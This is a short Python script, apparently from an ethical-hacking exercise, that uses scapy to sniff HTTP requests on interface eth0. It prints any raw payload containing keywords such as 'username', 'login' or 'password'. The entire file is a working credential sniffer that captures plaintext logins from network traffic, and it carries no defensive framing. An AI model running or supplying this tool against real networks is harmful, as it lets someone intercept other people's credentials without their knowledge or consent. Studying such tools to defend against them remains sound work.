#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http # Module to be able to filter HTTP packets, we have to install it running "pip install scapy_http" in the terminal too

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            load_str = load.decode()
            keywords = ["username", "user", "login", "password", "pass"]
            for keyword in keywords:
                if keyword in load_str:
                    print(load)
                    break

sniff("eth0")